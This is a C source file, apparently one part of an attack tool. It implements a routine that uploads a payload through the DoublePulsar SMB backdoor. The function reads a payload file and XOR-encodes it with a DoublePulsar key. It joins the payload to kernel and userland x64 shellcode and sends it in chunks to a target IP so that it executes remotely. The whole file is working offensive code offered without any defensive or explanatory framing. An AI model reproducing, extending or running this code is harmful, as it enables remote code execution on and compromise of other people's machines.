#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>
#include <dirent.h>
#include <poll.h>
#include <pthread.h>
#include <math.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pwd.h>
#include <grp.h>
#include <utime.h>
#include <syslog.h>
#include <wchar.h>
#include "config.h"

#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

extern uint32_t DoublePulsarXORKeyCalculator(uint32_t sig);
extern void xor_buffer(unsigned char *buffer, size_t length, uint32_t key);
extern int smb_send(const char *ip, int port, const unsigned char *buffer,
                    size_t length);

int upload_payload(const char *ip, int port, const char *payload_path,
                   int payload_type)
{
    int fd = -1;
    unsigned char *launcher = NULL;
    unsigned char *payload = NULL;
    size_t launcher_len = 0;
    size_t launcher_capacity = 0;
    size_t part1_len = sizeof(KERNEL_SHELLCODE_X64_PART1);
    size_t part2_len = sizeof(KERNEL_SHELLCODE_X64_PART2);
    size_t userland_len = sizeof(USERLAND_SHELLCODE_X64);
    size_t payload_len;
    size_t offset;
    size_t template_len = sizeof(DP_EXEC_PKT);
    uint32_t key;
    unsigned char process_hash[4];
    int result = -1;

    if (ip == NULL || payload_path == NULL || SMB_CHUNK_SIZE == 0)
        return -1;

    fd = open(payload_path, O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        goto cleanup;

    launcher_capacity = 8192;
    launcher = malloc(launcher_capacity);
    if (launcher == NULL)
        goto cleanup;

    for (;;) {
        ssize_t n;

        if (launcher_len == launcher_capacity) {
            size_t new_capacity = launcher_capacity * 2;
            unsigned char *new_launcher = realloc(launcher, new_capacity);

            if (new_launcher == NULL)
                goto cleanup;
            launcher = new_launcher;
            launcher_capacity = new_capacity;
        }

        n = read(fd, launcher + launcher_len, launcher_capacity - launcher_len);
        if (n > 0) {
            launcher_len += (size_t)n;
            continue;
        }
        if (n == 0)
            break;
        if (errno == EINTR)
            continue;
        goto cleanup;
    }

    if (close(fd) < 0) {
        fd = -1;
        goto cleanup;
    }
    fd = -1;

    key = DoublePulsarXORKeyCalculator((uint32_t)payload_type);
    xor_buffer(launcher, launcher_len, key);

    process_hash[0] = (unsigned char)((uint32_t)payload_type & 0xffu);
    process_hash[1] = (unsigned char)(((uint32_t)payload_type >> 8) & 0xffu);
    process_hash[2] = (unsigned char)(((uint32_t)payload_type >> 16) & 0xffu);
    process_hash[3] = (unsigned char)(((uint32_t)payload_type >> 24) & 0xffu);

    payload_len = part1_len + sizeof(process_hash) + part2_len +
                  userland_len + launcher_len;
    payload = malloc(payload_len == 0 ? 1 : payload_len);
    if (payload == NULL)
        goto cleanup;

    offset = 0;
    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART1, part1_len);
    offset += part1_len;
    memcpy(payload + offset, process_hash, sizeof(process_hash));
    offset += sizeof(process_hash);
    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART2, part2_len);
    offset += part2_len;
    memcpy(payload + offset, USERLAND_SHELLCODE_X64, userland_len);
    offset += userland_len;
    memcpy(payload + offset, launcher, launcher_len);

    for (offset = 0; offset < payload_len;) {
        size_t chunk_len = payload_len - offset;
        unsigned char *packet;
        size_t packet_len;

        if (chunk_len > SMB_CHUNK_SIZE)
            chunk_len = SMB_CHUNK_SIZE;

        packet_len = template_len + chunk_len;
        packet = malloc(packet_len);
        if (packet == NULL)
            goto cleanup;

        memcpy(packet, DP_EXEC_PKT, template_len);
        memcpy(packet + template_len, payload + offset, chunk_len);

        if (smb_send(ip, port, packet, packet_len) < 0) {
            free(packet);
            goto cleanup;
        }

        free(packet);
        offset += chunk_len;
    }

    result = 0;

cleanup:
    if (fd >= 0)
        close(fd);
    free(payload);
    free(launcher);
    return result;
}